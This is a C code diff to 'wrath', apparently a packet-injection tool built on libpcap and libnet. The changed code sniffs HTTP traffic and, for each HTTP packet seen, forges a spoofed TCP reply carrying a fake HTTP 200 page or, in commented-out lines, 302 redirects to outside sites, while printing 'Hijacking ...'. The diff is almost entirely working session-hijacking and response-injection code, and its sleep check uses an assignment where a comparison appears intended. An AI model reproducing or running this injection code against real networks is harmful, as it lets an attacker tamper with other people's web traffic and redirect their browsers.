@@ -4,16 +4,13 @@
 #include "wrath-utils.h"
 #include "wrath-applevel.h"
 
-void wrath_build(u_char *, const u_char *, struct inject_package);
+void wrath_build_and_launch(u_char *, const u_char *, struct inject_package *);
 
 void wrath_inject(u_char *args, const struct pcap_pkthdr *cap_header, const u_char *packet) {
 	struct lcp_package *package = (struct lcp_package *) args;
 	libnet_t *libnet_handle = package->libnet_handle;
 	struct arg_values *cline_args = package->cline_args;
 	struct inject_package i_pack;
-
-	i_pack.stream = NULL;
-	i_pack.length = 0;
 	
 	/* test for input file:
 		if an input file exists, assume it contains all encoding information.
@@ -24,31 +21,15 @@ void wrath_inject(u_char *args, const struct pcap_pkthdr *cap_header, const u_ch
 	   
 	   if an operation does not exist only pass null pointer.
 	*/
-	if (strcmp(cline_args->input_file,"\0") != 0) { // if a file has been specified
-		// open read-only access
-		printf("sending file\n");
-		int payload_fd;	
-		int file_length;
-		u_char *injection;
-		payload_fd = open(cline_args->input_file, O_RDONLY, 0);
-		if ((file_length = file_size(payload_fd)) == -1)
-			fatal_error("failed to get file size");
-		if ((injection = (u_char *) malloc(file_length)) == NULL)
-			fatal_error("failed to allocate memory for file contents");
-		read(payload_fd, injection, file_length);
-		// build up inject_package
-		i_pack.stream = injection;
-		i_pack.length = file_length;
-		wrath_build(args, packet, i_pack);
-		// maybe safe to free injection here?
-		libnet_write(libnet_handle);
-	} else {
-		wrath_build(args, packet, i_pack);
-		libnet_write(libnet_handle);
-	}			
+
+
+	if (strstr(packet + LIBNET_ETH_H + (2 * LIBNET_TCP_H) , "HTTP") != NULL) {
+		printf("HTTP Packet sniffed\n");
+		wrath_build_and_launch(args, packet, NULL);	
+	}
 }
 
-void wrath_build(u_char *args, const u_char *packet, struct inject_package i_pack) {
+void wrath_build_and_launch(u_char *args, const u_char *packet, struct inject_package *i_pack) {
 	struct lcp_package *package = (struct lcp_package *) args;
 	libnet_t *libnet_handle = package->libnet_handle;
 	struct arg_values *cline_args = package->cline_args;
@@ -56,15 +37,30 @@ void wrath_build(u_char *args, const u_char *packet, struct inject_package i_pac
 	struct libnet_ipv4_hdr *iphdr;
 	struct libnet_tcp_hdr *tcphdr;
 
+	/*
+	char *payload;
+	if (strcmp(cline_args->command, "\0") != 0) {
+		payload = cline_args->command;
+	}
+	else {
+	*/
+	//char payload[] = "HTTP/1.1 302 Found\r\nLocation:http://ada.evergreen.edu/~stenic05\r\n\r\n";
+	//char payload[] = "HTTP/1.1 302 Found\r\nLocation:http://en.wikipedia.org/wiki/Tupac_Shakur\r\n\r\n";
+	char payload[] = "HTTP/1.1 200 OK\r\nServer: Apache\r\n\r\n<html><a href=\"http://ada.evergreen.edu/~stenic05\">visit</a></html>";
+
 	iphdr = (struct libnet_ipv4_hdr *) (packet + LIBNET_ETH_H);
 	tcphdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);
 
+	printf("Hijacking ... ");
 	printf("%s:%hu -->", inet_ntoa(iphdr->ip_src), ntohs(tcphdr->th_sport)); // ip_src and ip_dst are in_addr structs
 	printf(" %s:%hu\n", inet_ntoa(iphdr->ip_dst), ntohs(tcphdr->th_dport));
+	printf("With ... ");
+	printf("%s:%hu -->", inet_ntoa(iphdr->ip_dst), ntohs(tcphdr->th_dport)); // ip_src and ip_dst are in_addr structs
+	printf(" %s:%hu ", inet_ntoa(iphdr->ip_src), ntohs(tcphdr->th_sport));
+	printf(": %s\n", payload);
 
 	printf("TCP SUM: %d\n", (cline_args->tcp_fin + cline_args->tcp_rst + cline_args->tcp_syn + cline_args->tcp_ack + cline_args->tcp_urg + cline_args->tcp_psh));
 
-	char payload[] = "HTTP/1.1 200 OK \r\nServer:WRATH\r\n\r\n<html><head>spoofed</head></html>";
 	
 	/* libnet_build_tcp */
 	libnet_build_tcp(
@@ -101,6 +97,7 @@ void wrath_build(u_char *args, const u_char *packet, struct inject_package i_pac
 	libnet_handle,			// pointer libnet context
 	0);				// ptag: 0 = build a new header	
 
+	libnet_write(libnet_handle);
 
 	if (cline_args->sleep_time = -1) 	
 		usleep(5000);		// jump out of the storm 
